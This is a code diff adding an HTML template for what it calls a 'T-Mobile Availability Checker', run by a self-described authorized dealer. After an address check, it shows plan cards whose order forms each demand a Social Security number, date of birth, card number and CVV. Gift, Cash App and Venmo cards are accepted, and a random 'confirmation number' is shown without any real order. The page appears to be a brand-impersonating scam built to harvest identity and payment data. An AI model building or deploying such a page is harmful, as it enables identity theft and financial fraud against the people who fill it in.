@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>T-Mobile Availability Checker</title>
+    <style>
+    body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        background-color: #f0f0f0;
+    }
+
+    h1 {
+        color: #333;
+    }
+
+    p {
+        color: #666;
+        font-size: 18px;
+    }
+
+    form {
+        max-width: 400px;
+        margin: 20px auto;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        text-align: left;
+    }
+
+    label {
+        display: block;
+        font-weight: bold;
+        margin-bottom: 10px;
+        color: #333;
+    }
+
+    input[type="text"],
+    input[type="number"] {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 16px;
+        box-sizing: border-box;
+    }
+
+    button[type="submit"] {
+        background-color: #007acc;
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        font-size: 18px;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+        display: block;
+        margin: 0 auto;
+    }
+
+    button[type="submit"]:hover {
+        background-color: #005da9;
+    }
+
+    #availabilityStatus {
+        font-size: 20px;
+        font-weight: bold;
+        margin-top: 20px;
+    }
+
+    /* Additional styles for the new elements */
+    p#unavailableMessage,
+    div#litePlans,
+    div#unlimitedPlan {
+        display: none;
+    }
+
+    /* Styles for the new plan elements */
+    #litePlans {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 20px;
+        flex-wrap: wrap;
+    }
+
+    /* Modify the styles for the ".plan" class */
+    .plan {
+        flex-basis: calc(25% - 20px); /* Adjust width to create a horizontal layout */
+        margin: 10px;
+        padding: 20px;
+        border: 2px solid #007acc;
+        border-radius: 10px;
+        background-color: #fff;
+        text-align: center;
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+        cursor: pointer;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .plan:hover {
+        transform: scale(1.05);
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .plan h2 {
+        font-size: 24px;
+        color: #333;
+    }
+
+    .plan p {
+        font-size: 18px;
+        color: #666;
+        margin: 10px 0;
+    }
+
+    .plan button {
+        background-color: #007acc;
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        font-size: 18px;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+    }
+
+    .plan button:hover {
+        background-color: #005da9;
+    }
+
+    /* Add styles for the "Choose Your Plans" header */
+    h2 {
+        text-align: center;
+        color: #333;
+        margin-top: 20px;
+    }
+    </style>
+</head>
+<body>
+    <h1>T-Mobile Availability Checker</h1>
+    <p>Enter your address details to check availability:</p>
+
+    <form id="availabilityForm" method="post" action="/check_availability">
+        <label for="streetAddress">Street Address:</label>
+        <input type="text" id="streetAddress" name="q4_streetAddress" placeholder="Enter your street address" required><br>
+
+        <label for="zipcode">Zipcode:</label>
+        <input type="number" id="zipcode" name="q5_zipcode" placeholder="Enter your zipcode" required><br>
+
+        <button type="submit">Check Availability</button>
+    </form>
+
+    <p id="availabilityStatus">
+        <!-- The availability status will be displayed here -->
+        {{ availability_status }}
+    </p>
+
+    <!-- Placeholder for "UNFORTUNATELY T-MOBILE HOME INTERNET IS NOT AVAILABLE" message -->
+    <p id="unavailableMessage">
+        UNFORTUNATELY T-MOBILE HOME INTERNET IS NOT AVAILABLE AT YOUR ADDRESS AT THE MOMENT DUE TO THE COVERAGE STRENGTH, BUT DO NOT WORRY AS WE ARE AN AUTHORIZED DEALER FOR 300 PROVIDERS. WE CAN SEARCH FOR ALTERNATIVE PROVIDERS FOR INTERNET. PLEASE CALL OUR CUSTOMER SERVICE NUMBER TO CHECK WHAT WE HAVE FOR YOU
+        <a href="tel:888-888-8888"><button>Click to Call</button></a>
+    </p>
+
+    <!-- Placeholders for the four plans -->
+    <div id="litePlans">
+        <h2>Choose Your Plans</h2>
+        <div class="plan">
+            <h2>LITE PLAN 1</h2>
+            <p>PRICE: $50</p>
+            <p>DATA LIMIT: 100 GB</p>
+            <button class="orderButton" data-plan="Lite Plan 1">Order Online</button>
+            <div class="orderForm" style="display: none;">
+                <h2>Order Form for Lite Plan 1</h2>
+                <!-- Add form fields for first name, last name, email, phone, shipping address, etc. -->
+                <form>
+                    <label for="firstName">First Name:</label>
+            <input type="text" id="firstName" name="firstName" required><br>
+            
+            <label for="lastName">Last Name:</label>
+            <input type="text" id="lastName" name="lastName" required><br>
+            
+            <label for="email">Email Address:</label>
+            <input type="email" id="email" name="email" required><br>
+            
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" name="phone" required><br>
+            
+            <label for="shippingAddress">Shipping Address:</label>
+            <textarea id="shippingAddress" name="shippingAddress" required></textarea><br>
+            
+            <label for="ssn">Social Security Number:</label>
+            <input type="password" id="ssn" name="ssn" required><br>
+            
+            <label for="dob">Date of Birth:</label>
+            <input type="date" id="dob" name="dob" required><br>
+            
+            <label for="cardType">Card Type:</label>
+            <select id="cardType" name="cardType">
+                <option value="Visa">Visa</option>
+                <option value="Master">Master</option>
+                <option value="American Express">American Express</option>
+                <option value="Gift Card">Gift Card</option>
+                <option value="Prepaid Card">Prepaid Card</option>
+                <option value="Cash App Card">Cash App Card</option>
+                <option value="Venmo Card">Venmo Card</option>
+            </select><br>
+            
+            <label for="cardNumber">Card Number:</label>
+            <input type="text" id="cardNumber" name="cardNumber" required><br>
+            
+            <label for="cvv">CVV Number:</label>
+            <input type="password" id="cvv" name="cvv" required><br>
+            
+            <label for="expirationDate">Expiration Date:</label>
+            <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required><br>
+            
+            <!-- Add more form fields as needed -->
+                    <button type="submit">Place Order</button>
+                </form>
+                <div class="confirmation" style="display: none;">
+                    <p>Thank you for your order! Your confirmation number is: <span id="confirmationNumber"></span></p>
+                </div>
+            </div>
+        </div>
+
+        <div class="plan">
+            <h2>LITE PLAN 2</h2>
+            <p>PRICE: $70</p>
+            <p>DATA LIMIT: 150 GB</p>
+            <button class="orderButton" data-plan="Lite Plan 2">Order Online</button>
+            <div class="orderForm" style="display: none;">
+                <h2>Order Form for Lite Plan 2</h2>
+                <!-- Add form fields for first name, last name, email, phone, shipping address, etc. -->
+                <form>
+                    <label for="firstName">First Name:</label>
+            <input type="text" id="firstName" name="firstName" required><br>
+            
+            <label for="lastName">Last Name:</label>
+            <input type="text" id="lastName" name="lastName" required><br>
+            
+            <label for="email">Email Address:</label>
+            <input type="email" id="email" name="email" required><br>
+            
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" name="phone" required><br>
+            
+            <label for="shippingAddress">Shipping Address:</label>
+            <textarea id="shippingAddress" name="shippingAddress" required></textarea><br>
+            
+            <label for="ssn">Social Security Number:</label>
+            <input type="password" id="ssn" name="ssn" required><br>
+            
+            <label for="dob">Date of Birth:</label>
+            <input type="date" id="dob" name="dob" required><br>
+            
+            <label for="cardType">Card Type:</label>
+            <select id="cardType" name="cardType">
+                <option value="Visa">Visa</option>
+                <option value="Master">Master</option>
+                <option value="American Express">American Express</option>
+                <option value="Gift Card">Gift Card</option>
+                <option value="Prepaid Card">Prepaid Card</option>
+                <option value="Cash App Card">Cash App Card</option>
+                <option value="Venmo Card">Venmo Card</option>
+            </select><br>
+            
+            <label for="cardNumber">Card Number:</label>
+            <input type="text" id="cardNumber" name="cardNumber" required><br>
+            
+            <label for="cvv">CVV Number:</label>
+            <input type="password" id="cvv" name="cvv" required><br>
+            
+            <label for="expirationDate">Expiration Date:</label>
+            <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required><br>
+            
+            <!-- Add more form fields as needed -->
+                    <button type="submit">Place Order</button>
+                </form>
+                <div class="confirmation" style="display: none;">
+                    <p>Thank you for your order! Your confirmation number is: <span id="confirmationNumber"></span></p>
+                </div>
+            </div>
+        </div>
+
+        <div class="plan">
+            <h2>LITE PLAN 3</h2>
+            <p>PRICE: $100</p>
+            <p>DATA LIMIT: 200 GB</p>
+            <button class="orderButton" data-plan="Lite Plan 3">Order Online</button>
+            <div class="orderForm" style="display: none;">
+                <h2>Order Form for Lite Plan 3</h2>
+                <!-- Add form fields for first name, last name, email, phone, shipping address, etc. -->
+                <form>
+                    <label for="firstName">First Name:</label>
+            <input type="text" id="firstName" name="firstName" required><br>
+            
+            <label for="lastName">Last Name:</label>
+            <input type="text" id="lastName" name="lastName" required><br>
+            
+            <label for="email">Email Address:</label>
+            <input type="email" id="email" name="email" required><br>
+            
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" name="phone" required><br>
+            
+            <label for="shippingAddress">Shipping Address:</label>
+            <textarea id="shippingAddress" name="shippingAddress" required></textarea><br>
+            
+            <label for="ssn">Social Security Number:</label>
+            <input type="password" id="ssn" name="ssn" required><br>
+            
+            <label for="dob">Date of Birth:</label>
+            <input type="date" id="dob" name="dob" required><br>
+            
+            <label for="cardType">Card Type:</label>
+            <select id="cardType" name="cardType">
+                <option value="Visa">Visa</option>
+                <option value="Master">Master</option>
+                <option value="American Express">American Express</option>
+                <option value="Gift Card">Gift Card</option>
+                <option value="Prepaid Card">Prepaid Card</option>
+                <option value="Cash App Card">Cash App Card</option>
+                <option value="Venmo Card">Venmo Card</option>
+            </select><br>
+            
+            <label for="cardNumber">Card Number:</label>
+            <input type="text" id="cardNumber" name="cardNumber" required><br>
+            
+            <label for="cvv">CVV Number:</label>
+            <input type="password" id="cvv" name="cvv" required><br>
+            
+            <label for="expirationDate">Expiration Date:</label>
+            <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required><br>
+            
+            <!-- Add more form fields as needed -->
+                    <button type="submit">Place Order</button>
+                </form>
+                <div class="confirmation" style="display: none;">
+                    <p>Thank you for your order! Your confirmation number is: <span id="confirmationNumber"></span></p>
+                </div>
+            </div>
+        </div>
+
+        <div class="plan">
+            <h2>LITE PLAN 4</h2>
+            <p>PRICE: $150</p>
+            <p>DATA LIMIT: 300 GB</p>
+            <button class="orderButton" data-plan="Lite Plan 4">Order Online</button>
+            <div class="orderForm" style="display: none;">
+                <h2>Order Form for Lite Plan 4</h2>
+                <!-- Add form fields for first name, last name, email, phone, shipping address, etc. -->
+                <form>
+                    <label for="firstName">First Name:</label>
+            <input type="text" id="firstName" name="firstName" required><br>
+            
+            <label for="lastName">Last Name:</label>
+            <input type="text" id="lastName" name="lastName" required><br>
+            
+            <label for="email">Email Address:</label>
+            <input type="email" id="email" name="email" required><br>
+            
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" name="phone" required><br>
+            
+            <label for="shippingAddress">Shipping Address:</label>
+            <textarea id="shippingAddress" name="shippingAddress" required></textarea><br>
+            
+            <label for="ssn">Social Security Number:</label>
+            <input type="password" id="ssn" name="ssn" required><br>
+            
+            <label for="dob">Date of Birth:</label>
+            <input type="date" id="dob" name="dob" required><br>
+            
+            <label for="cardType">Card Type:</label>
+            <select id="cardType" name="cardType">
+                <option value="Visa">Visa</option>
+                <option value="Master">Master</option>
+                <option value="American Express">American Express</option>
+                <option value="Gift Card">Gift Card</option>
+                <option value="Prepaid Card">Prepaid Card</option>
+                <option value="Cash App Card">Cash App Card</option>
+                <option value="Venmo Card">Venmo Card</option>
+            </select><br>
+            
+            <label for="cardNumber">Card Number:</label>
+            <input type="text" id="cardNumber" name="cardNumber" required><br>
+            
+            <label for="cvv">CVV Number:</label>
+            <input type="password" id="cvv" name="cvv" required><br>
+            
+            <label for="expirationDate">Expiration Date:</label>
+            <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required><br>
+            
+            <!-- Add more form fields as needed -->
+                    <button type="submit">Place Order</button>
+                </form>
+                <div class="confirmation" style="display: none;">
+                    <p>Thank you for your order! Your confirmation number is: <span id="confirmationNumber"></span></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Placeholder for "TMOBILE HOME INTERNET UNLIMITED" plan -->
+    <div id="unlimitedPlan">
+        <h2>TMOBILE HOME INTERNET UNLIMITED</h2>
+        <p>PRICE: $50</p>
+        <p>DATA: Unlimited</p>
+        <button class="orderButton" data-plan="Unlimited Plan">Order Now</button>
+        <div class="orderForm" style="display: none;">
+            <h2>Order Form for TMOBILE HOME INTERNET UNLIMITED</h2>
+            <!-- Add form fields for first name, last name, email, phone, shipping address, etc. -->
+            <form>
+                <label for="firstName">First Name:</label>
+            <input type="text" id="firstName" name="firstName" required><br>
+            
+            <label for="lastName">Last Name:</label>
+            <input type="text" id="lastName" name="lastName" required><br>
+            
+            <label for="email">Email Address:</label>
+            <input type="email" id="email" name="email" required><br>
+            
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" name="phone" required><br>
+            
+            <label for="shippingAddress">Shipping Address:</label>
+            <textarea id="shippingAddress" name="shippingAddress" required></textarea><br>
+            
+            <label for="ssn">Social Security Number:</label>
+            <input type="password" id="ssn" name="ssn" required><br>
+            
+            <label for="dob">Date of Birth:</label>
+            <input type="date" id="dob" name="dob" required><br>
+            
+            <label for="cardType">Card Type:</label>
+            <select id="cardType" name="cardType">
+                <option value="Visa">Visa</option>
+                <option value="Master">Master</option>
+                <option value="American Express">American Express</option>
+                <option value="Gift Card">Gift Card</option>
+                <option value="Prepaid Card">Prepaid Card</option>
+                <option value="Cash App Card">Cash App Card</option>
+                <option value="Venmo Card">Venmo Card</option>
+            </select><br>
+            
+            <label for="cardNumber">Card Number:</label>
+            <input type="text" id="cardNumber" name="cardNumber" required><br>
+            
+            <label for="cvv">CVV Number:</label>
+            <input type="password" id="cvv" name="cvv" required><br>
+            
+            <label for="expirationDate">Expiration Date:</label>
+            <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required><br>
+            
+            <!-- Add more form fields as needed -->
+                <button type="submit">Place Order</button>
+            </form>
+            <div class="confirmation" style="display: none;">
+                <p>Thank you for your order! Your confirmation number is: <span id="confirmationNumber"></span></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            var availabilityStatus = "{{ availability_status }}";
+
+
+
+     function showOrderForm(planName) {
+                var plan = document.querySelector(`button[data-plan="${planName}"]`);
+                var orderForm = plan.nextElementSibling;
+                plan.style.display = "none";
+                orderForm.style.display = "block";
+            }
+
+            var orderButtons = document.querySelectorAll(".orderButton");
+            orderButtons.forEach(function (button) {
+                button.addEventListener("click", function () {
+                    var planName = button.getAttribute("data-plan");
+                    showOrderForm(planName);
+                });
+            });
+
+            var orderForms = document.querySelectorAll(".orderForm form");
+            orderForms.forEach(function (form) {
+                form.addEventListener("submit", function (event) {
+                    event.preventDefault();
+
+                    var confirmationNumber = Math.floor(Math.random() * 1000000);
+
+                    var confirmationDiv = form.nextElementSibling;
+                    var confirmationNumberSpan = confirmationDiv.querySelector("#confirmationNumber");
+                    confirmationNumberSpan.textContent = confirmationNumber;
+                    confirmationDiv.style.display = "block";
+
+                    form.style.display = "none";
+                });
+            });
+
+            // Get the availability status value
+            var availabilityStatus = "{{ availability_status }}";
+
+            // Get the elements
+            var unavailableMessage = document.getElementById("unavailableMessage");
+            var litePlans = document.getElementById("litePlans");
+            var unlimitedPlan = document.getElementById("unlimitedPlan");
+
+            if (availabilityStatus === "NOT AVAILABLE") {
+                // Show the "UNFORTUNATELY T-MOBILE HOME INTERNET IS NOT AVAILABLE" message
+                unavailableMessage.style.display = "block";
+            } else if (availabilityStatus === "LITE AVAILABLE") {
+                // Show the four Lite plans
+                litePlans.style.display = "block";
+            } else if (availabilityStatus === "HINT AVAILABLE") {
+                // Show the "TMOBILE HOME INTERNET UNLIMITED" plan
+                unlimitedPlan.style.display = "block";
+            }
+        });
+    </script>
+</body>
+</html>
